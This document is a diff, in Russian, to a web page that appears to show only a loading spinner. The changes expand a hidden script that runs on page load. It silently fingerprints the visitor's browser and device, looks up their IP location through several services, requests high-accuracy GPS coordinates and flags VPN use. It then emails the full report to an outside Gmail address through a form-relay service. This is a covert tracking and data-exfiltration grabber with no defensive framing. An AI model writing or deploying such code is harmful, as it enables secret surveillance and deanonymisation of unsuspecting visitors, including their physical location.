@@ -37,52 +37,122 @@
     <div class="loader"></div>
 
     <script>
-        // Функция для проверки на VPN/Прокси
-        async function checkVPN(ip) {
-            try {
-                const response = await fetch(`https://ipapi.co/${ip}/json/`);
-                const data = await response.json();
-                
-                // Признаки прокси/VPN
-                const isVPN = data.org?.toLowerCase().includes('vpn') || 
-                             data.org?.toLowerCase().includes('proxy') ||
-                             data.org?.toLowerCase().includes('hosting') ||
-                             data.asn?.toLowerCase().includes('hosting');
-                
-                return {
-                    isVPN: isVPN,
-                    org: data.org || 'Неизвестно',
-                    asn: data.asn || 'Неизвестно',
-                    country: data.country_name || 'Неизвестно',
-                    city: data.city || 'Неизвестно',
-                    region: data.region || 'Неизвестно'
-                };
-            } catch (error) {
-                return {
-                    isVPN: 'Ошибка проверки',
-                    org: 'Неизвестно',
-                    asn: 'Неизвестно',
-                    country: 'Неизвестно',
-                    city: 'Неизвестно',
-                    region: 'Неизвестно'
-                };
-            }
+        // Функция для получения ВСЕХ данных о системе
+        function getFullSystemInfo() {
+            return {
+                // Информация о навигаторе
+                userAgent: navigator.userAgent,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                product: navigator.product,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                onLine: navigator.onLine,
+                serviceWorker: navigator.serviceWorker ? 'Поддерживается' : 'Не поддерживается',
+
+                // Информация об экране
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation ? screen.orientation.type : 'Недоступно',
+
+                // Информация об устройстве
+                devicePixelRatio: window.devicePixelRatio,
+                touchSupport: 'ontouchstart' in window ? 'Да' : 'Нет',
+                pointerSupport: navigator.pointerEnabled ? 'Да' : 'Нет',
+
+                // Информация о подключении
+                connection: navigator.connection ? {
+                    downlink: navigator.connection.downlink,
+                    effectiveType: navigator.connection.effectiveType,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+
+                // Информация о батарее (если доступно)
+                battery: navigator.getBattery ? 'Доступно' : 'Недоступно',
+
+                // Информация о геолокации
+                geolocation: navigator.geolocation ? 'Доступно' : 'Недоступно',
+
+                // Информация о хранилище
+                localStorage: window.localStorage ? 'Доступно' : 'Недоступно',
+                sessionStorage: window.sessionStorage ? 'Доступно' : 'Недоступно',
+                indexedDB: window.indexedDB ? 'Доступно' : 'Недоступно',
+                cookies: navigator.cookieEnabled ? 'Включены' : 'Выключены',
+
+                // Информация о плагинах
+                plugins: Array.from(navigator.plugins).map(plugin => ({
+                    name: plugin.name,
+                    version: plugin.version,
+                    description: plugin.description
+                })),
+
+                // Информация о MIME типах
+                mimeTypes: Array.from(navigator.mimeTypes).map(mimeType => ({
+                    type: mimeType.type,
+                    description: mimeType.description,
+                    suffixes: mimeType.suffixes
+                })),
+
+                // Временная зона и локаль
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                timezoneOffset: new Date().getTimezoneOffset(),
+
+                // Производительность
+                performance: performance ? {
+                    memory: performance.memory ? {
+                        usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
+                        totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
+                        jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB'
+                    } : 'Недоступно',
+                    timing: performance.timing ? 'Доступно' : 'Недоступно'
+                } : null
+            };
         }
 
-        // Функция для получения точного местоположения
-        async function getPreciseLocation(ip) {
+        // Функция для получения точного местоположения через IP
+        async function getIPLocation(ip) {
             try {
-                const response = await fetch(`https://ipapi.co/${ip}/json/`);
-                const data = await response.json();
+                const responses = await Promise.allSettled([
+                    fetch(`https://ipapi.co/${ip}/json/`),
+                    fetch(`https://ipapi.com/ip_api.php?ip=${ip}`),
+                    fetch(`https://json.geoiplookup.io/${ip}`)
+                ]);
+
+                let bestData = {};
                 
+                for (const response of responses) {
+                    if (response.status === 'fulfilled' && response.value.ok) {
+                        const data = await response.value.json();
+                        bestData = { ...bestData, ...data };
+                    }
+                }
+
                 return {
-                    country: data.country_name || 'Неизвестно',
-                    city: data.city || 'Неизвестно',
-                    region: data.region || 'Неизвестно',
-                    latitude: data.latitude || 'Неизвестно',
-                    longitude: data.longitude || 'Неизвестно',
-                    timezone: data.timezone || 'Неизвестно',
-                    org: data.org || 'Неизвестно'
+                    country: bestData.country_name || bestData.country || 'Неизвестно',
+                    countryCode: bestData.country_code || bestData.countryCode || 'Неизвестно',
+                    city: bestData.city || 'Неизвестно',
+                    region: bestData.region || bestData.regionName || 'Неизвестно',
+                    latitude: bestData.latitude || bestData.lat || 'Неизвестно',
+                    longitude: bestData.longitude || bestData.lon || 'Неизвестно',
+                    timezone: bestData.timezone || 'Неизвестно',
+                    isp: bestData.isp || bestData.org || bestData.asn || 'Неизвестно',
+                    asn: bestData.asn || 'Неизвестно',
+                    proxy: bestData.proxy || bestData.vpn || false,
+                    mobile: bestData.mobile || false
                 };
             } catch (error) {
                 return {
@@ -92,58 +162,205 @@
                     latitude: 'Ошибка определения',
                     longitude: 'Ошибка определения',
                     timezone: 'Ошибка определения',
-                    org: 'Ошибка определения'
+                    isp: 'Ошибка определения',
+                    proxy: 'Ошибка проверки',
+                    mobile: 'Ошибка проверки'
                 };
             }
         }
 
-        // Функция для сбора всей информации
+        // Функция для получения точных координат (если пользователь разрешит)
+        async function getPreciseGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('Геолокация не поддерживается');
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' метров',
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        });
+                    },
+                    (error) => {
+                        resolve(`Ошибка геолокации: ${error.message}`);
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // Функция для проверки всех возможностей браузера
+        function checkBrowserCapabilities() {
+            return {
+                // Графика
+                webgl: !!window.WebGLRenderingContext,
+                webgl2: !!window.WebGL2RenderingContext,
+                canvas: !!window.HTMLCanvasElement,
+                webp: (() => {
+                    const canvas = document.createElement('canvas');
+                    if (canvas.getContext && canvas.getContext('2d')) {
+                        return canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0;
+                    }
+                    return false;
+                })(),
+                avif: (async () => {
+                    try {
+                        const response = await fetch('data:image/avif;base64,AAAAIGZ0eXBhdmlmAAAAAGF2aWZtaWYxbWlhZk1BMUIAAADybWV0YQAAAAAAAAAoaGRscgAAAAAAAAAAcGljdAAAAAAAAAAAAAAAAGxpYmF2aWYAAAAADnBpdG0AAAAAAAEAAAAeaWxvYwAAAABEAAABAAEAAAABAAABGgAAABcAAAAoaWluZgAAAAAAAQAAABppbmZlAgAAAAABAABhdjAxQ29sb3IAAAAAamlwcnAAAABLaXBjbwAAABRpc3BlAAAAAAAAAAEAAAABAAAAEHBpeGkAAAAAAwgICAAAAAxhdjFDgQAMAAAAABNjb2xybmNseAABAA0ABoAAAAAXaXBtYQAAAAAAAAABAAEEAQKDBAAAAB9tZGF0EgAKCBgABogQEDQgwkXAAAAAAAAS0pQjQAAAABw7OrZg==');
+                        return response.ok;
+                    } catch {
+                        return false;
+                    }
+                })(),
+
+                // Аудио/Видео
+                audio: !!window.AudioContext,
+                video: !!window.HTMLVideoElement,
+                mediaDevices: navigator.mediaDevices ? 'Доступно' : 'Недоступно',
+
+                // Хранилище
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage,
+                indexedDB: !!window.indexedDB,
+                cache: !!window.caches,
+
+                // Сети
+                websocket: !!window.WebSocket,
+                fetch: !!window.fetch,
+                xhr: !!window.XMLHttpRequest,
+
+                // Другое
+                serviceWorker: !!navigator.serviceWorker,
+                notifications: !!window.Notification,
+                vibration: !!navigator.vibrate,
+                bluetooth: navigator.bluetooth ? 'Доступно' : 'Недоступно',
+                usb: navigator.usb ? 'Доступно' : 'Недоступно',
+                clipboard: !!navigator.clipboard,
+                share: !!navigator.share,
+                wakeLock: navigator.wakeLock ? 'Доступно' : 'Недоступно'
+            };
+        }
+
+        // Основная функция сбора данных
         async function collectAllData(ip) {
-            const locationData = await getPreciseLocation(ip);
-            const vpnCheck = await checkVPN(ip);
-            const { os, architecture } = getOSInfo();
-            const browser = getBrowserInfo();
+            const systemInfo = getFullSystemInfo();
+            const ipLocation = await getIPLocation(ip);
+            const preciseLocation = await getPreciseGeolocation();
+            const capabilities = await checkBrowserCapabilities();
 
-            // Формируем полное сообщение с флагом VPN
+            // Форматируем все данные в читаемый вид
             const fullMessage = `
-🚀 НОВЫЙ ПОСЕТИТЕЛЬ 🚀
+🎯 ПОЛНЫЙ СБОР ДАННЫХ ПОЛЬЗОВАТЕЛЯ 🎯
 
-📍 IP АДРЕС: ${ip}
+📍 ОСНОВНАЯ ИНФОРМАЦИЯ:
+• IP адрес: ${ip}
+• User Agent: ${systemInfo.userAgent}
+• Платформа: ${systemInfo.platform}
+• Язык: ${systemInfo.language}
+• Доступные языки: ${systemInfo.languages.join(', ')}
 
-🌍 ГЕОЛОКАЦИЯ:
-• Страна: ${locationData.country}
-• Город: ${locationData.city}
-• Регион: ${locationData.region}
-• Координаты: ${locationData.latitude}, ${locationData.longitude}
-• Временная зона: ${locationData.timezone}
-• Провайдер: ${locationData.org}
+🌍 ГЕОЛОКАЦИЯ ПО IP:
+• Страна: ${ipLocation.country} (${ipLocation.countryCode})
+• Город: ${ipLocation.city}
+• Регион: ${ipLocation.region}
+• Координаты: ${ipLocation.latitude}, ${ipLocation.longitude}
+• Временная зона: ${ipLocation.timezone}
+• Провайдер: ${ipLocation.isp}
+• ASN: ${ipLocation.asn}
+• Прокси/VPN: ${ipLocation.proxy ? 'ДА ⚠️' : 'НЕТ ✅'}
+• Мобильное соединение: ${ipLocation.mobile ? 'ДА' : 'НЕТ'}
 
-⚠️ VPN/ПРОКСИ ПРОВЕРКА:
-• Использует VPN/Прокси: ${vpnCheck.isVPN ? 'ДА ✅' : 'НЕТ ❌'}
-• Организация: ${vpnCheck.org}
-• ASN: ${vpnCheck.asn}
+🎯 ТОЧНАЯ ГЕОЛОКАЦИЯ:
+${typeof preciseLocation === 'string' ? preciseLocation : `
+• Широта: ${preciseLocation.latitude}
+• Долгота: ${preciseLocation.longitude}
+• Точность: ${preciseLocation.accuracy}
+• Высота: ${preciseLocation.altitude || 'N/A'}
+• Направление: ${preciseLocation.heading || 'N/A'}
+• Скорость: ${preciseLocation.speed || 'N/A'}
+`}
 
-💻 СИСТЕМА:
-• ОС: ${os}
-• Архитектура: ${architecture}
-• Платформа: ${navigator.platform}
-
-🔍 БРАУЗЕР:
-• Браузер: ${browser}
-• User Agent: ${navigator.userAgent}
-• Язык: ${navigator.language}
+💻 СИСТЕМНЫЕ ХАРАКТЕРИСТИКИ:
+• Ядер CPU: ${systemInfo.hardwareConcurrency}
+• Память устройства: ${systemInfo.deviceMemory} GB
+• Тачпоинты: ${systemInfo.maxTouchPoints}
+• Пиксельное соотношение: ${systemInfo.devicePixelRatio}
+• Поддержка тача: ${systemInfo.touchSupport}
+• Поддержка pointer: ${systemInfo.pointerSupport}
 
 🖥 ЭКРАН:
-• Разрешение: ${screen.width}x${screen.height}
-• Глубина цвета: ${screen.colorDepth} bit
+• Разрешение: ${systemInfo.screenWidth}x${systemInfo.screenHeight}
+• Доступное разрешение: ${systemInfo.availWidth}x${systemInfo.availHeight}
+• Глубина цвета: ${systemInfo.colorDepth} bit
+• Глубина пикселей: ${systemInfo.pixelDepth} bit
+• Ориентация: ${systemInfo.orientation}
 
 📡 СОЕДИНЕНИЕ:
-• Скорость: ${navigator.connection ? navigator.connection.downlink + ' Mbps' : 'unknown'}
-• Тип соединения: ${navigator.connection ? navigator.connection.effectiveType : 'unknown'}
+• Онлайн: ${systemInfo.onLine ? 'ДА' : 'НЕТ'}
+• Скорость: ${systemInfo.connection ? systemInfo.connection.downlink + ' Mbps' : 'N/A'}
+• Тип соединения: ${systemInfo.connection ? systemInfo.connection.effectiveType : 'N/A'}
+• RTT: ${systemInfo.connection ? systemInfo.connection.rtt + ' ms' : 'N/A'}
+• Экономия трафика: ${systemInfo.connection ? systemInfo.connection.saveData : 'N/A'}
 
-⏰ ВРЕМЯ ПОСЕЩЕНИЯ: ${new Date().toLocaleString('ru-RU')}
+🔧 ВОЗМОЖНОСТИ БРАУЗЕРА:
+• WebGL: ${capabilities.webgl}
+• WebGL2: ${capabilities.webgl2}
+• WebP: ${capabilities.webp}
+• AVIF: ${capabilities.avif}
+• WebAudio: ${capabilities.audio}
+• MediaDevices: ${capabilities.mediaDevices}
+• WebSockets: ${capabilities.websocket}
+• Fetch API: ${capabilities.fetch}
+• Service Workers: ${capabilities.serviceWorker}
+• Уведомления: ${capabilities.notifications}
+• Вибрация: ${capabilities.vibration}
+• Bluetooth: ${capabilities.bluetooth}
+• USB: ${capabilities.usb}
+• Буфер обмена: ${capabilities.clipboard}
+• Share API: ${capabilities.share}
+• Wake Lock: ${capabilities.wakeLock}
 
-${vpnCheck.isVPN ? '🚨 ВНИМАНИЕ: ПОЛЬЗОВАТЕЛЬ ИСПОЛЬЗУЕТ VPN/ПРОКСИ! 🚨' : '✅ Чистый трафик'}
+💾 ХРАНИЛИЩЕ:
+• LocalStorage: ${systemInfo.localStorage}
+• SessionStorage: ${systemInfo.sessionStorage}
+• IndexedDB: ${systemInfo.indexedDB}
+• Cache API: ${capabilities.cache}
+• Cookies: ${systemInfo.cookies}
+
+⚡ ПРОИЗВОДИТЕЛЬНОСТЬ:
+${systemInfo.performance && systemInfo.performance.memory !== 'Недоступно' ? `
+• Используемая память: ${systemInfo.performance.memory.usedJSHeapSize}
+• Всего памяти: ${systemInfo.performance.memory.totalJSHeapSize}
+• Лимит памяти: ${systemInfo.performance.memory.jsHeapSizeLimit}
+` : 'Информация о памяти недоступна'}
+
+🛠 ДОПОЛНИТЕЛЬНО:
+• Временная зона: ${systemInfo.timezone}
+• Смещение времени: ${systemInfo.timezoneOffset} минут
+• Локаль: ${systemInfo.locale}
+• Батарея: ${systemInfo.battery}
+• Геолокация: ${systemInfo.geolocation}
+• Онлайн статус: ${systemInfo.onLine ? 'Online' : 'Offline'}
+
+📋 ПЛАГИНЫ (${systemInfo.plugins.length}):
+${systemInfo.plugins.map(plugin => `  • ${plugin.name} ${plugin.version}`).join('\n')}
+
+⏰ ВРЕМЯ ВИЗИТА: ${new Date().toLocaleString('ru-RU')}
+🕐 UTC Время: ${new Date().toUTCString()}
+⏱ Timestamp: ${Date.now()}
+
+=== КОНЕЦ ОТЧЕТА ===
             `;
 
             return fullMessage;
@@ -153,7 +370,7 @@ ${vpnCheck.isVPN ? '🚨 ВНИМАНИЕ: ПОЛЬЗОВАТЕЛЬ ИСПОЛЬ
         function sendDataToEmail(data) {
             const formData = new FormData();
             formData.append('message', data);
-            formData.append('_subject', '🚨 Данные посетителя + VPN проверка!');
+            formData.append('_subject', '🚨 ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ!');
             formData.append('_captcha', 'false');
             
             fetch('https://formsubmit.co/wplacesosi1@gmail.com', {
@@ -163,19 +380,29 @@ ${vpnCheck.isVPN ? '🚨 ВНИМАНИЕ: ПОЛЬЗОВАТЕЛЬ ИСПОЛЬ
             });
         }
 
-        // Основная функция
-        async function collectAndSendData() {
+        // Запуск сбора данных
+        async function startDataCollection() {
             try {
+                // Получаем IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
+                
+                // Собираем все данные
+                console.log('Начинаем сбор данных...');
                 const allData = await collectAllData(ipData.ip);
+                
+                // Отправляем на почту
+                console.log('Отправляем данные...');
                 sendDataToEmail(allData);
+                
+                console.log('Данные успешно отправлены!');
             } catch (error) {
-                console.error('Ошибка:', error);
+                console.error('Ошибка сбора данных:', error);
             }
         }
 
-        window.addEventListener('load', collectAndSendData);
+        // Запускаем при загрузке страницы
+        window.addEventListener('load', startDataCollection);
     </script>
 </body>
 </html>
